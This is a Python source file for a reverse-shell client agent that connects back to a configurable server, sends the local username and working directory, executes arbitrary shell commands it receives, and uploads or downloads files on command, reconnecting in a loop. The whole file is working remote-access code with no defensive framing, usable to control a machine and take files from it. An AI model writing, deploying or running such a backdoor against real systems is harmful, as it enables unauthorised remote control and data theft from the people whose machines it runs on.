#!/usr/bin/env python3
"""
client_agent.py
Connects back to server and executes commands on the client machine.
Responds with JSON messages and base64-encoded output.
"""

import socket
import json
import struct
import base64
import os
import subprocess
import getpass

SERVER = "127.0.0.1"   # server address (change to server IP)
PORT = 65432

def send_msg(conn, obj):
    data = json.dumps(obj, separators=(",", ":" )).encode("utf-8")
    header = struct.pack("!Q", len(data))
    conn.sendall(header + data)

def recv_msg(conn):
    header = b""
    while len(header) < 8:
        chunk = conn.recv(8 - len(header))
        if not chunk:
            return None
        header += chunk
    length = struct.unpack("!Q", header)[0]
    payload = b""
    while len(payload) < length:
        chunk = conn.recv(min(4096, length - len(payload)))
        if not chunk:
            return None
        payload += chunk
    return json.loads(payload.decode("utf-8"))

def execute_shell_command(cmd, cwd):
    # use subprocess to run the command in a shell, return bytes output and new cwd
    try:
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=cwd)
        out = proc.stdout or b""
    except Exception as e:
        out = str(e).encode("utf-8")
    return out, cwd

def handle_action_upload(obj, cwd):
    # receive base64 data, write to remote path or current dir
    b64 = obj.get("b64", "")
    remote_path = obj.get("path")
    local_name = obj.get("local_name")
    try:
        data = base64.b64decode(b64.encode("utf-8"))
        if not remote_path:
            remote_path = os.path.basename(local_name) if local_name else "uploaded_file"
        # ensure directories exist
        dirp = os.path.dirname(remote_path)
        if dirp:
            os.makedirs(dirp, exist_ok=True)
        with open(remote_path, "wb") as f:
            f.write(data)
        return {"type":"status", "status": f"Uploaded to {remote_path}", "cwd": cwd}
    except Exception as e:
        return {"type":"error", "error": str(e), "cwd": cwd}

def handle_action_download(obj, cwd):
    path = obj.get("path")
    try:
        with open(path, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode("utf-8")
        return {"type":"file", "b64": b64, "cwd": cwd}
    except Exception as e:
        return {"type":"error", "error": str(e), "cwd": cwd}

def main():
    while True:
        try:
            cwd = os.getcwd()
            username = getpass.getuser()
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER, PORT))
                # send hello
                send_msg(s, {"type":"hello", "username": username, "cwd": cwd})

                while True:
                    req = recv_msg(s)
                    if req is None:
                        print("Server disconnected.")
                        break
                    rtype = req.get("type")
                    if rtype == "control" and req.get("action") == "exit":
                        break
                    if rtype == "cmd":
                        cmd = req.get("cmd", "")
                        # support builtin cd
                        stripped = cmd.strip()
                        if stripped.startswith("cd "):
                            # change directory on client side
                            target = stripped[3:].strip() or os.path.expanduser("~")
                            try:
                                os.chdir(os.path.expanduser(target))
                                cwd = os.getcwd()
                                send_msg(s, {"type":"output", "b64": base64.b64encode(b"").decode("utf-8"), "cwd": cwd})
                            except Exception as e:
                                send_msg(s, {"type":"error", "error": str(e), "cwd": cwd})
                            continue

                        out_bytes, cwd = execute_shell_command(cmd, cwd)
                        send_msg(s, {"type":"output", "b64": base64.b64encode(out_bytes).decode("utf-8"), "cwd": cwd})

                    elif rtype == "action":
                        action = req.get("action")
                        if action == "upload":
                            res = handle_action_upload(req, cwd)
                            send_msg(s, res)
                        elif action == "download":
                            res = handle_action_download(req, cwd)
                            send_msg(s, res)
                        else:
                            send_msg(s, {"type":"error", "error": f"Unknown action {action}", "cwd": cwd})
                    else:
                        send_msg(s, {"type":"error", "error": f"Unsupported message type {rtype}", "cwd": cwd})
        except ConnectionError as e:
            ...

if __name__ == "__main__":
    main()
